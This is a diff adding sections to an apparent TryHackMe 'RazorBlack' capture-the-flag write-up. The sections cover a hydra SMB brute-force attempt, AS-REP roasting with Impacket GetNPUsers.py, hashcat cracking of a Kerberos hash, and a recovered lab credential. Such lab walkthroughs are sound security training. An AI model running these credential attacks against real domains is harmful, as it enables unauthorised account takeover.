@@ -236,7 +236,7 @@ This file containes a column of `Names` and `Roles`. I'm not sure at this time w
 
 Usernames are usually single words with no spaces. There are a few common ways accounts are made, one being `first-initial.lastname` so an example here would be 'd.port'. Another option is `first-name.last-initial` so `daven.port`. Then there are the same options without the `.` so `davenp` and `dport`. The file above was named `sbradley.txt` so that gives us a hint. 
 
-Let's be thorough here and just create a username list with several different options using `username_generator` from github.
+Let's be thorough here and just create a username list with several different options using `username_generator` from github [Username Generator](https://github.com/therodri2/username_generator.git).
 
 ```console
 ┌──(viorage㉿kali)-[~/Tryhackme/RazorBlack]                                                                                      
@@ -252,3 +252,78 @@ Receiving objects: 100% (9/9), done.
 ![r_usernames](r_usernames.png)
 
 ___
+
+## SMB Share crack Fail
+
+At this time I wasn't sure where to go but the next question suggested we need to find a zip file. I therefor attempted to use `hydra` to try to guess a password to SMB, which ultimately failed.
+
+`hyra -L users.lst -P /usr/share/wordlists/rockyou.txt smb://10.10.30.235`
+
+___
+
+## Impacket GetNPUsers.py
+
+I stumbled around for a while trying different things to no avail.
+
+I wasn't really sure where to go at this time, so as I normally do with Windows machines, I went and looked through some `Impacket` scripts. I found the `GetNPUsers.py` script which `Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking` (Note: It wasn't the first script I found, I tried several other before I got here).
+
+The biggest clue I found for the script was the very last line from the output of running this tools which was:
+
+```For this operation you don't need credentials.```
+
+I ran the script with my initial username list and got a couple hits, where I noticed that the username format was `first-inital + lastname` I reformated my initial list.
+
+```console
+┌──(viorage㉿kali)-[/usr/share/doc/python3-impacket/examples]                                                                                                         
+└─$ ./GetNPUsers.py raz0rblack.thm/ -usersfile ~/Tryhackme/RazorBlack/username_generator/names.lst -request -dc-ip 10.10.30.235                                       
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                                                                                                                                                                                  
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                             
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                      
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                         
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                        
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                    
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                       
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                       --- SNIP ---
+
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM: <Redacted>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Here we can confirm at least 3 users:
+- lvetrova
+- twilliams
+- sbradley
+
+![r_getnpusers](r_getnpusers.png)
+
+___
+
+## Hashcat
+From here we can try to crack the Kerberos hash for the `twilliams` users. I browsed to [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)   and searched for the correct `Hash-Mode` which was `18200` as you can see below.
+
+![r_hashcat](r_hashcat.png)
+
+Once we have the correct `Hash-Mode` we can attempt to crack it. Now, I'm not sure what happened here but I had to pull down the hash 4 times to actually crack it. 
+
+`hashcat -m 18200 -a 0 -w 3 -O hash4.txt /usr/share/wordlists/rockyou.txt --force`
+
+![r_crack](r_crack.png)
+
+> Creds - twilliams:roastpotatoes
+
+___
+
+## Where to next?
